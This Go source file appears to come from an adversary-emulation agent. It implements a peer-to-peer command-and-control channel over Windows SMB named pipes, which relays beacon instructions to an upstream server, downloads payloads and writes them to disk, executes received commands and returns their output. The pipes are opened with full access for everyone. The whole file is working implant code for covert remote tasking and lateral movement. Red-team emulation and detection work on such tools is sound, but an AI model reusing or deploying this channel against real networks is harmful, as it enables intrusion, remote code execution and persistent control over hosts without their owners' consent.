// +build windows

package contact

import (
    "bufio"
    "fmt"
    "net"
    "encoding/json"
    "math/rand"
    "strings"
    "os"
    "path/filepath"
    "../winio"
    "../output"
    "../execute"
    "../util"
)

//PipeAPI2 communicates through SMB named pipes using an alternative implementation. Implements the Contact interface
type SmbPipeAPI2 struct {
    ReturnMailBoxPipePath string // agent will set this up if sending p2p requests.
    ReturnMailBoxListener net.Listener // Listener object for client mailbox pipe.
}

//PipeReceiver forwards data received from SMB pipes to the upstream server. Implements the P2pReceiver interface
type SmbPipeReceiver2 struct { }

func init() {
	CommunicationChannels["P2pSmbPipe2"] = SmbPipeAPI2{"", nil}
	P2pReceiverChannels["SmbPipe2"] = SmbPipeReceiver2{}
}

// SmbPipeReceiver2 Implementation

// Listen on agent's request pipe for client request. Process request using a go routine, which may involve sending
// a response back to the client.
func (receiver SmbPipeReceiver2) StartReceiver(profile map[string]interface{}, p2pReceiverConfig map[string]string, upstreamComs Contact) {
    pipePath := "\\\\.\\pipe\\" + p2pReceiverConfig["p2pReceiver"]
    go receiver.startReceiverHelper(profile, pipePath, upstreamComs)
}

// Helper method for StartReceiver. Must be run as a go routine.
func (receiver SmbPipeReceiver2) startReceiverHelper(profile map[string]interface{}, pipePath string, upstreamComs Contact) {
    listener, err := listenPipeFullAccess(pipePath)
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with creating listener for pipe %s\n%v", pipePath, err))
        return
    }
    output.VerbosePrint(fmt.Sprintf("[*] Listening on client handler pipe %s", pipePath))
    defer listener.Close()

    // Whenever a client connects to pipe with a request, process the request using a go routine.
    for {
        totalData, err := fetchDataFromPipe(listener)
        if err != nil {
            output.VerbosePrint(fmt.Sprintf("[!] Error with reading client input for pipe %s\n%v", pipePath, err))
            continue
        }

        // Parse message and handle request.
        message := bytesToP2pMsg(totalData)
        switch message.MessageType {
        case INSTR_GET_INSTRUCTIONS:
            go receiver.forwardGetInstructions(message, profile, upstreamComs)
        case INSTR_GET_PAYLOAD_BYTES:
            go receiver.forwardPayloadBytesDownload(message, profile, upstreamComs)
        case INSTR_SEND_EXECUTION_RESULTS:
            go receiver.forwardSendExecResults(message, profile, upstreamComs)
        default:
            output.VerbosePrint(fmt.Sprintf("[!] ERROR: invalid instruction type for receiver-bound p2p message %d", message.MessageType))
        }
    }
}

// Pass the instruction request to the upstream coms, and return the response.
func (receiver SmbPipeReceiver2) forwardGetInstructions(message P2pMessage, profile map[string]interface{}, upstreamComs Contact) {
    paw := message.RequestingAgentPaw
    output.VerbosePrint(fmt.Sprintf("[*] Forwarding instructions to %s on behalf of paw %s", profile["server"].(string), paw))

    // message payload contains profile to send upstream
    var clientProfile map[string]interface{}
    json.Unmarshal(message.Payload, &clientProfile)
    clientProfile["server"] = profile["server"] // make sure we send the instructions to the right place.

    // Get upstream response.
    response := upstreamComs.GetInstructions(clientProfile)

    // Connect to client mailbox to send response.
    if len(message.ReturnTo) > 0 {
        data, _ := json.Marshal(response)
        forwarderPaw := ""
        if profile["paw"] != nil {
            forwarderPaw = profile["paw"].(string)
        }
        pipeMsgData := buildP2pMsgBytes(forwarderPaw, RESPONSE_INSTRUCTIONS, data, "")
        sendDataToPipe(message.ReturnTo, pipeMsgData)
        output.VerbosePrint(fmt.Sprintf("[*] Sent instruction response to paw %s at mailbox %s:", paw, message.ReturnTo))
    } else {
        output.VerbosePrint(fmt.Sprintf("[-] ERROR. P2p message from client did not specify a return address."))
    }
}

func (receiver SmbPipeReceiver2) forwardPayloadBytesDownload(message P2pMessage, profile map[string]interface{}, upstreamComs Contact) {
    paw := message.RequestingAgentPaw
    output.VerbosePrint(fmt.Sprintf("[*] Forwarding payload bytes request on behalf of paw %s", paw))

    // message payload contains file name (str) and platform (str)
    var fileInfo map[string]string
    json.Unmarshal(message.Payload, &fileInfo)

    // Get upstream response.
    upstreamResponse := upstreamComs.GetPayloadBytes(fileInfo["file"], profile["server"].(string), paw, fileInfo["platform"])

    // Return response downstream.
    // Connect to client mailbox to send response.
    if len(message.ReturnTo) > 0 {
        forwarderPaw := ""
        if profile["paw"] != nil {
            forwarderPaw = profile["paw"].(string)
        }
        pipeMsgData := buildP2pMsgBytes(forwarderPaw, RESPONSE_PAYLOAD_BYTES, upstreamResponse, "")
        sendDataToPipe(message.ReturnTo, pipeMsgData)
        output.VerbosePrint(fmt.Sprintf("[*] Sent payload bytes to paw %s at mailbox %s:", paw, message.ReturnTo))
    } else {
        output.VerbosePrint(fmt.Sprintf("[-] ERROR. P2p message from client did not specify a return address."))
    }
}

func (receiver SmbPipeReceiver2) forwardSendExecResults(message P2pMessage, profile map[string]interface{}, upstreamComs Contact) {
    paw := message.RequestingAgentPaw
    output.VerbosePrint(fmt.Sprintf("[*] Forwarding execution results on behalf of paw %s", paw))

    // message payload contains client profile and result info.
    var clientProfile map[string]interface{}
    json.Unmarshal(message.Payload, &clientProfile)
    if clientProfile == nil {
        output.VerbosePrint("[!] Error. Client sent blank message payload for execution results.")
        return
    }
    clientProfile["server"] = profile["server"]
    result := clientProfile["result"].(map[string]interface{})

    // Send execution results upstream.
    upstreamComs.SendExecutionResults(clientProfile, result)

    // Send response message to client.
    // Connect to client mailbox to send response.
    if len(message.ReturnTo) > 0 {
        forwarderPaw := ""
        if profile["paw"] != nil {
            forwarderPaw = profile["paw"].(string)
        }

        pipeMsgData := buildP2pMsgBytes(forwarderPaw, RESPONSE_SEND_EXECUTION_RESULTS, nil, "") // no data to send, just an ACK
        sendDataToPipe(message.ReturnTo, pipeMsgData)
        output.VerbosePrint(fmt.Sprintf("[*] Sent execution result delivery response to paw %s at mailbox %s:", paw, message.ReturnTo))
    } else {
        output.VerbosePrint(fmt.Sprintf("[-] ERROR. P2p message from client did not specify a return address."))
    }
}

/*
 * SmbPipeAPI implementation
 */

// Contact API functions

func (p2pPipeClient SmbPipeAPI2) GetInstructions(profile map[string]interface{}) map[string]interface{} {
    var out map[string]interface{}

    // Set up mailbox pipe for response, if needed.
    var err error = nil
    if p2pPipeClient.ReturnMailBoxListener == nil {
        err = setReturnMailBox(&p2pPipeClient)
    }

    if p2pPipeClient.ReturnMailBoxListener != nil && err == nil {
        // Send instruction request
        payload, _ := json.Marshal(profile)
        paw := ""
        if profile["paw"] != nil {
            paw = profile["paw"].(string)
        }
        pipeMsgData := buildP2pMsgBytes(paw, INSTR_GET_INSTRUCTIONS, payload, p2pPipeClient.ReturnMailBoxPipePath)
        sendDataToPipe(profile["server"].(string), pipeMsgData)

        // Get response.
        respData, err := fetchDataFromPipe(p2pPipeClient.ReturnMailBoxListener)
        if err != nil {
            output.VerbosePrint(fmt.Sprintf("[!] Error with reading response sent to pipe %s\n%v", p2pPipeClient.ReturnMailBoxPipePath, err))
            output.VerbosePrint(fmt.Sprintf("[-] P2p beacon via %s: DEAD", profile["server"].(string)))
        } else {
            serverResp := bytesToP2pMsg(respData)

            // Check if blank message was returned.
            if msgIsEmpty(serverResp) {
                output.VerbosePrint(fmt.Sprintf("[-] Empty message from server. P2p beacon DEAD via %s", profile["server"].(string)))
            } else if serverResp.MessageType != RESPONSE_INSTRUCTIONS {
                output.VerbosePrint(fmt.Sprintf("[!] Error: server sent invalid response type for getting instructions: %d", serverResp.MessageType))
                output.VerbosePrint(fmt.Sprintf("[-] P2p beacon via %s: DEAD", profile["server"].(string)))
            } else {
                // Message payload contains instruction info.
                json.Unmarshal(serverResp.Payload, &out)
                if out != nil {
                    out["sleep"] = int(out["sleep"].(float64))
                    out["watchdog"] = int(out["watchdog"].(float64))
                    output.VerbosePrint(fmt.Sprintf("[*] P2p beacon ALIVE via %s", profile["server"].(string)))
                } else {
                    output.VerbosePrint(fmt.Sprintf("[-] Empty payload from server. P2p beacon DEAD via %s", profile["server"].(string)))
                }
            }
        }
    } else {
        output.VerbosePrint(fmt.Sprintf("[!] ERROR: failed to set up return mailbox pipe listener. Error: %v", err))
        output.VerbosePrint(fmt.Sprintf("[-] P2p beacon via %s: DEAD", profile["server"].(string)))
    }
	return out
}

func (p2pPipeClient SmbPipeAPI2) DropPayloads(payload string, server string, uniqueId string, platform string) []string{
    payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
	var droppedPayloads []string
	for _, payload := range payloads {
		if len(payload) > 0 {
			droppedPayloads = append(droppedPayloads, p2pPipeClient.drop(payload, server, uniqueId, platform))
		}
	}
	return droppedPayloads
}

// Will obtain the payload bytes in memory to be written to disk later by caller.
func (p2pPipeClient SmbPipeAPI2) GetPayloadBytes(payload string, server string, uniqueID string, platform string) []byte {
	var payloadBytes []byte
	if len(payload) > 0 {
        // Set up mailbox pipe for response, if needed.
        var err error = nil
        if p2pPipeClient.ReturnMailBoxListener == nil {
            err = setReturnMailBox(&p2pPipeClient)
        }

        if p2pPipeClient.ReturnMailBoxListener != nil && err == nil {
            // Download single payload bytes. Create SMB Pipe message with instruction type INSTR_GET_PAYLOAD_BYTES
            // and payload as a map[string]string specifying the file and platform.
            output.VerbosePrint(fmt.Sprintf("[*] P2p Client Downloading new payload via %s: %s",server, payload))
            fileInfo := map[string]interface{} {"file": payload, "platform": platform}
            payload, _ := json.Marshal(fileInfo)
            pipeMsgData := buildP2pMsgBytes(uniqueID, INSTR_GET_PAYLOAD_BYTES, payload, p2pPipeClient.ReturnMailBoxPipePath)
            sendDataToPipe(server, pipeMsgData)
            respData, err := fetchDataFromPipe(p2pPipeClient.ReturnMailBoxListener)
            if err != nil {
                output.VerbosePrint("[!] Error: failed message response from forwarder.")
            } else {
                responseMsg := bytesToP2pMsg(respData)
                if responseMsg.MessageType == RESPONSE_PAYLOAD_BYTES {
                    // Payload bytes in message payload.
                    payloadBytes = responseMsg.Payload
                } else {
                    output.VerbosePrint(fmt.Sprintf("[!] Error: server sent invalid response type for getting getting payload bytes: %d", responseMsg.MessageType))
                }
             }
        } else {
            output.VerbosePrint(fmt.Sprintf("[!] ERROR: failed to set up return mailbox pipe listener. Cannot fetch payload bytes. Error: %v", err))
        }
	}
	return payloadBytes
}

func (p2pPipeClient SmbPipeAPI2) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
    timeout := int(command["timeout"].(float64))
    result := make(map[string]interface{})
    output, status, pid := execute.RunCommand(command["command"].(string), payloads, profile["platform"].(string), command["executor"].(string), timeout)
	result["id"] = command["id"]
	result["output"] = output
	result["status"] = status
	result["pid"] = pid
 	p2pPipeClient.SendExecutionResults(profile, result)
}

func (p2pPipeClient SmbPipeAPI2) C2RequirementsMet(criteria map[string]string) bool {
    return true
}

func (p2pPipeClient SmbPipeAPI2) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}) {
     // Set up mailbox pipe for response, if needed.
    var err error = nil
    if p2pPipeClient.ReturnMailBoxListener == nil {
        err = setReturnMailBox(&p2pPipeClient)
    }

    if p2pPipeClient.ReturnMailBoxListener != nil && err == nil {
        // Build SMB pipe message for sending execution results.
        // payload will contain JSON marshal of profile, with execution results
        profileCopy := profile
        profileCopy["result"] = result
        payload, _ := json.Marshal(profileCopy)
        output.VerbosePrint(fmt.Sprintf("[*] P2p Client: going to send execution results to %s", profile["server"].(string)))
        pipeMsgData := buildP2pMsgBytes(profile["paw"].(string), INSTR_SEND_EXECUTION_RESULTS, payload, p2pPipeClient.ReturnMailBoxPipePath)
        sendDataToPipe(profile["server"].(string), pipeMsgData)
        respData, err := fetchDataFromPipe(p2pPipeClient.ReturnMailBoxListener)
        if err != nil {
            output.VerbosePrint("[!] Error: failed execution result response from forwarder.")
        } else {
            responseMsg := bytesToP2pMsg(respData)
            if responseMsg.MessageType == RESPONSE_SEND_EXECUTION_RESULTS {
                output.VerbosePrint("[*] P2p Client: forwarder passed on our execution results.")
            } else {
                output.VerbosePrint(fmt.Sprintf("[!] Error: server sent invalid response type for sending execution results: %d", responseMsg.MessageType))
            }
         }
    } else {
        output.VerbosePrint(fmt.Sprintf("[!] ERROR: failed to set up return mailbox pipe listener. Cannot get response. Error: %v", err))
    }
}

func setReturnMailBox(pipeAPI *SmbPipeAPI2) error {
    // Generate random pipe name for return mail box pipe path.
    pipeName := getRandPipeName(rand.Intn(clientPipeNameMaxLen - clientPipeNameMinLen) + clientPipeNameMinLen)
    hostname, err := os.Hostname()
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] ERROR obtaining hostname: %v", err))
        return err
    }

    pipeAPI.ReturnMailBoxPipePath = "\\\\" + hostname + "\\pipe\\" + pipeName
    localPipePath := "\\\\.\\pipe\\" + pipeName

    // Create listener for Pipe
    listener, err := listenPipeFullAccess(localPipePath)

    if listener != nil && err == nil {
        pipeAPI.ReturnMailBoxListener = listener
        output.VerbosePrint(fmt.Sprintf("[*] Set p2p return mailbox pipe path to %s", pipeAPI.ReturnMailBoxPipePath))
        return nil
    } else {
        output.VerbosePrint(fmt.Sprintf("[-] Failed to listen on mailbox pipe path %s", localPipePath))
        return err
    }
}

// Helper functions

// Helper function that listens on pipe and returns listener and any error.
func listenPipeFullAccess(pipePath string) (net.Listener, error) {
    config := &winio.PipeConfig{
        SecurityDescriptor: "D:(A;;GA;;;S-1-1-0)", // File all access to everyone.
    }
    return winio.ListenPipe(pipePath, config)
}

// Helper function that waits for a connection to the listener and then returns sent data.
func fetchDataFromPipe(listener net.Listener) ([]byte, error) {
    conn, err := listener.Accept()
    defer conn.Close()

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with accepting connection to listener.\n%v", err))
        return nil, err
    }

    // Read in the data and close connection.
    pipeReader := bufio.NewReader(conn)
    data, _ := readPipeData(pipeReader)
    return data, nil
}

// Download single payload and write to disk
func (p2pPipeClient SmbPipeAPI2) drop(payload string, server string, uniqueID string, platform string) string {
    location := filepath.Join(payload)
	if len(payload) > 0 && util.Exists(location) == false {
	    data := p2pPipeClient.GetPayloadBytes(payload, server, uniqueID, platform)

        if data != nil {
		    util.WritePayloadBytes(location, data)
		}
	}
	return location
}

// Sends data to specified pipe.
func sendDataToPipe(pipePath string, data []byte) {
    conn, err := winio.DialPipe(pipePath, nil)

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error: %v", err))
        if err == winio.ErrTimeout {
            output.VerbosePrint(fmt.Sprintf("[!] Timed out trying to dial to pipe %s", pipePath))
        } else {
            output.VerbosePrint(fmt.Sprintf("[!] Error dialing to pipe %s\n", pipePath, err))
        }
        return
    }

    defer conn.Close()

    // Write data and close connection.
    writer := bufio.NewWriter(conn)
    writePipeData(data, writer)
}